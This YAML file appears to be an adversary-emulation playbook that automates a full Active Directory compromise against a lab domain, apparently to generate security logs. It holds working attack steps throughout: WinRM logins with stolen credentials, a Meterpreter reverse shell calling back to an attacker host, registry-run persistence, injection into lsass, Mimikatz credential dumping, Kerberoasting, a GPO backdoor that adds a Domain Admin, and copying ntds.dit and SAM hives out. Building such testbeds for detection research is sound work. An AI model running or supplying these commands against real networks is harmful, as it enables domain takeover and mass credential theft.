vars:
  DOMAIN: aecid-testbed.com
  COMPROMISED_USER_USERNAME: Alice
  COMPROMISED_USER_PASSWORD: Pa$$w0rd
  COMPROMISED_ADMIN_USERNAME: wsadmin
  COMPROMISED_ADMIN_PASSWORD: Root.PW1
  COMPROMISED_ADMIN_HASH: 20f4829ff2880daba668aeac071b73db
  IP_KALI: 10.10.10.200
  IP_WEB: 10.10.10.10
  IP_DC1: 10.0.0.100
  PAYLOADS_DIR: /home/superuser/payloads
  MSF_PAYLOAD: windows/x64/meterpreter/reverse_tcp

commands:
  - type: shell
    cmd: "evil-winrm -i $IP_WEB -u $COMPROMISED_USER_USERNAME -p '$COMPROMISED_USER_PASSWORD'\n"
    command_timeout: 30
    creates_session: winrm_domain_user
    interactive: true
    metadata:
      techniques: "T1021.006, T1047"
      tactics: "Lateral Movement"
      technique_name: "Remote Services: Windows Remote Management"

  - type: shell
    session: winrm_domain_user
    interactive: true
    cmd: "Add-Content -Path \"C:\\Scripts\\Logger.ps1\" -Value \"net localgroup administrators alice /add\"\n"
    metadata:
      techniques: "T1053.005, T1547"
      tactics: "Execution, Persistence, Privilege Escalation"
      technique_name: "Scheduled Task/Job: Scheduled Task"

  - type: sleep
    seconds: 60

  - type: msf-payload
    cmd: $MSF_PAYLOAD
    payload_options:
        LHOST: $IP_KALI
        LPORT: "9001"
    format: exe
    local_path: $PAYLOADS_DIR/msf.exe

  - type: shell
    session: winrm_domain_user
    interactive: true
    cmd: "upload $PAYLOADS_DIR/msf.exe C:\\\\Users\\\\Public\\\\msf.exe\n"

  - type: shell
    session: winrm_domain_user
    interactive: true
    cmd: "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Persistence\" -Value \"C:\\Users\\Public\\msf.exe\" -PropertyType \"String\" -Force\n"
    metadata:
      techniques: "T1547.001"
      tactics: "Persistence, Privilege Escalation"
      technique_name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"

  - type: msf-module
    creates_session: msfshell_local_admin
    cmd: exploit/multi/handler
    payload: $MSF_PAYLOAD
    payload_options:
      LHOST: $IP_KALI
      LPORT: "9001"
    background: true
    kill_on_exit: true

  - type: shell
    session: winrm_domain_user
    interactive: true
    cmd: "C:\\Users\\Public\\msf.exe\n"

  - type: msf-session
    session: msfshell_local_admin
    cmd: getuid

  - type: msf-session
    session: msfshell_local_admin
    cmd: getsystem

  - type: msf-session
    session: msfshell_local_admin
    cmd: getuid

  - type: msf-session
    session: msfshell_local_admin
    cmd: pgrep lsass

  - type: setvar
    cmd: $RESULT_STDOUT
    variable: $LSASS_PID

  - type: msf-session
    session: msfshell_local_admin
    cmd: migrate $LSASS_PID
    metadata:
      techniques: "T1055"
      tactics: "Defense Evasion, Privilege Escalation"
      technique_name: "Process Injection"

  - type: sleep
    seconds: 10

  - type: msf-session
    session: msfshell_local_admin
    cmd: getpid

  - type: msf-session
    session: msfshell_local_admin
    cmd: load kiwi

  - type: msf-session
    session: msfshell_local_admin
    cmd: "kiwi_cmd \"privilege::debug\""

  - type: msf-session
    session: msfshell_local_admin
    cmd: "kiwi_cmd \"sekurlsa::logonpasswords\""
    metadata:
      techniques: "T1003.001"
      tactics: "Credential Access"
      technique_name: "OS Credential Dumping: LSASS Memory"

  - type: msf-session
    session: msfshell_local_admin
    cmd: "kiwi_cmd \"lsadump::cache\""
    metadata:
      techniques: "T1003.005"
      tactics: "Credential Access"
      technique_name: "OS Credential Dumping: Cached Domain Credentials"

  - type: msf-session
    session: msfshell_local_admin
    cmd: "kiwi_cmd \"lsadump::sam\""
    metadata:
      techniques: "T1003.002"
      tactics: "Credential Access"
      technique_name: "OS Credential Dumping: Security Account Manager"

  - type: shell
    session: winrm_domain_user
    interactive: true
    cmd: "upload $PAYLOADS_DIR/Rubeus.exe C:\\\\Users\\\\Public\\\\Rubeus.exe\n"

  - type: msf-session
    session: msfshell_local_admin
    cmd: "execute -f C:\\\\Users\\\\Public\\\\Rubeus.exe -a \"kerberoast /nowrap\" -i"
    metadata:
      techniques: "T1558.003"
      tactics: "Credential Access"
      technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"

### Usually we would now crack the hash offline
### This does not generate logs however, just write a debug message to save some time
  - type: debug
    cmd: Cracking the hash of wsadmin obtained through kerberoasting offline ...

  - type: shell
    cmd: "evil-winrm -i $IP_WEB -u $COMPROMISED_ADMIN_USERNAME -p '$COMPROMISED_ADMIN_PASSWORD'\n"
    command_timeout: 30
    creates_session: winrm_domain_admin
    interactive: true
    metadata:
      techniques: "T1021.006, T1047"
      tactics: "Lateral Movement"
      technique_name: "Remote Services: Windows Remote Management"

  - type: shell
    session: winrm_domain_admin
    interactive: true
    cmd: "upload $PAYLOADS_DIR/SharpGPOAbuse.exe C:\\\\Users\\\\Public\\\\SharpGPOAbuse.exe\n"

  - type: shell
    session: winrm_domain_admin
    interactive: true
    cmd: "$Username = \"$COMPROMISED_ADMIN_USERNAME\"; $Password = \"$COMPROMISED_ADMIN_PASSWORD\"; $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); $Session = New-PSSession -ComputerName DC1 -Credential $Credential;\n"

  - type: shell
    session: winrm_domain_admin
    interactive: true
    cmd: "Copy-Item -Path C:\\Users\\Public\\SharpGPOAbuse.exe -ToSession $Session -Destination C:\\Users\\Public;\n"

### Arguments in SharpGPOAbuse seem to be limited in length, write payload to a PowerShell script instead
  - type: shell
    session: winrm_domain_admin
    interactive: true
    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Write-Output \"New-ADUser -Name $BACKDOOR_NAME -AccountPassword (ConvertTo-SecureString 'P@ssword' -AsPlainText -Force) -Enabled 1\" > C:\\Users\\Public\\adduser.ps1; Write-Output \"Add-ADGroupMember -Identity 'Domain Admins' -Members $BACKDOOR_NAME\" >> C:\\Users\\Public\\adduser.ps1; }\n"

### Generate a random backdoor GPO name so we can run the playbook multiple times without having to worry about duplicate GPO names if it is not removed
  - type: shell
    cmd: tr -dc A-Za-z0-9 </dev/urandom | head -c 10

  - type: setvar
    cmd: $RESULT_STDOUT
    variable: $BACKDOOR_NAME

  - type: shell
    session: winrm_domain_admin
    interactive: true
    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { New-GPO -Name \"$BACKDOOR_NAME\"; New-GPLINK -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com'; C:\\Users\\Public\\SharpGPOAbuse.exe --AddComputerTask --GPOName $BACKDOOR_NAME --Author $COMPROMISED_ADMIN_USERNAME --TaskName \"$BACKDOOR_NAME\" --Command 'powershell.exe' --Arguments 'powershell.exe -ep bypass C:\\Users\\Public\\adduser.ps1'; gpupdate /force }\n"
    metadata:
      techniques: "T1484.001"
      tactics: "Defense Evasion, Privilege Escalation"
      technique_name: "Domain or Tenant Policy Modification: Group Policy Modification"

  - type: shell
    session: winrm_domain_admin
    interactive: true
    command_timeout: 30
    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { reg.exe save HKLM\\SYSTEM C:\\Users\\Public\\SYSTEM.hive /y; reg.exe save HKLM\\SAM C:\\Users\\Public\\SAM.hive /y; vssadmin CREATE SHADOW /For=C:; $ShadowCopyVolume = (vssadmin list shadows | Select-String \"Shadow Copy Volume:\" | Select-Object -First 1).ToString().Split(\":\")[1].Trim(); cmd.exe /c copy $ShadowCopyVolume\\Windows\\NTDS\\ntds.dit c:\\Users\\Public\\ntds.dit; vssadmin delete shadows /All /Quiet }\n"
    metadata:
      techniques: "T1006"
      tactics: "Defense Evasion"
      technique_name: "Direct Volume Access"

### Invoke-Ninjacopy seems to be broken :(
# - type: shell
#   session: winrm_domain_admin
#   interactive: true
#   cmd: "upload $PAYLOADS_DIR/Invoke-NinjaCopy.ps1 C:\\\\Users\\\\Public\\\\Invoke-NinjaCopy.ps1\n"

# - type: shell
#   session: winrm_domain_admin
#   interactive: true
#   cmd: "Copy-Item -Path C:\\Users\\Public\\Invoke-NinjaCopy.ps1 -ToSession $Session -Destination C:\\Users\\Public; Invoke-Command -Session $Session -ScriptBlock { Import-Module C:\\Users\\Public\\Invoke-NinjaCopy.ps1; Invoke-NinjaCopy -Path \"C:\\Windows\\System32\\Config\\SAM\" -LocalDestination \"C:\\Users\\Public\\SAM\"; Invoke-NinjaCopy -Path \"C:\\Windows\\System32\\Config\\SYSTEM\" -LocalDestination \"C:\\Users\\Public\\SYSTEM\"; Invoke-NinjaCopy -Path \"C:\\Windows\\NTDS\\ntds.dit\" -LocalDestination \"C:\\Users\\Public\\ntds.dit\"; }\n"
#   metadata:
#     techniques: "T1006"
#     tactics: "Defense Evasion"
#     technique_name: "Direct Volume Access"

  - type: shell
    session: winrm_domain_admin
    interactive: true
    cmd: "Copy-Item -Path C:\\Users\\Public\\SAM.hive -FromSession $Session -Destination C:\\Users\\Public\\; Copy-Item -Path C:\\Users\\Public\\SYSTEM.hive -FromSession $Session -Destination C:\\Users\\Public; Copy-Item -Path C:\\Users\\Public\\ntds.dit -FromSession $Session -Destination C:\\Users\\Public;\n"

  - type: shell
    session: winrm_domain_admin
    interactive: true
    cmd: "download C:\\\\Users\\\\Public\\\\SAM.hive\n"

  - type: shell
    session: winrm_domain_admin
    interactive: true
    cmd: "download C:\\\\Users\\\\Public\\\\SYSTEM.hive\n"

  - type: shell
    session: winrm_domain_admin
    interactive: true
    command_timeout: 30
    cmd: "download C:\\\\Users\\\\Public\\\\ntds.dit\n"

### Usually we would now decrypt the ntds.dit offline
### This does not generate logs however, just write a debug message to save some time
  - type: debug
    cmd: Decrypting ntds.dit offline ...

### Optional: Cleanup DC1
  - type: shell
    session: winrm_domain_admin
    interactive: true
    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Remove-GPLink -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com' -Confirm:0; Remove-GPO -Name \"$BACKDOOR_NAME\" -Confirm:0; Remove-Item C:\\Users\\Public\\*.* -Force }\n"

### Optional: Cleanup WEB
  - type: shell
    session: winrm_domain_admin
    interactive: true
    cmd: "Remove-Item C:\\Users\\Public\\*.* -Force\n"

### Optional: Cleanup KALI
  - type: shell
    cmd: rm *.hive *.dit
